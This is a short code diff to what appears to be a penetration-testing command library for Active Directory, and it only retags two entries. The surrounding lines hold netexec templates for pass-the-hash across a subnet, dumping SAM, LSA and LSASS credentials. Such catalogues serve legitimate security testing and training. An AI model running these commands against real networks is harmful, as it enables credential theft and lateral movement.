@@ -392,7 +392,7 @@ export const AD_NOCREDS_DA_COMMANDS: LibraryCommand[] = [
     template: 'nxc smb {SUBNET} -u {USER} -H {HASH} --sam --lsa',
     os: 'any',
     runFrom: 'attacker',
-    goals: ['e-ad-da-loot-all'],
+    goals: ['h-loot-hashes'],
     why: 'Each (Pwn3d!) host goes back through Loot: local hashes, files, cached creds.',
     source: 'oscp-notes',
   },
@@ -403,7 +403,7 @@ export const AD_NOCREDS_DA_COMMANDS: LibraryCommand[] = [
     template: 'nxc smb {SUBNET} -u {USER} -H {HASH} -M lsassy',
     os: 'any',
     runFrom: 'attacker',
-    goals: ['e-ad-da-loot-all'],
+    goals: ['h-loot-hashes'],
     source: 'raven',
   },
   {
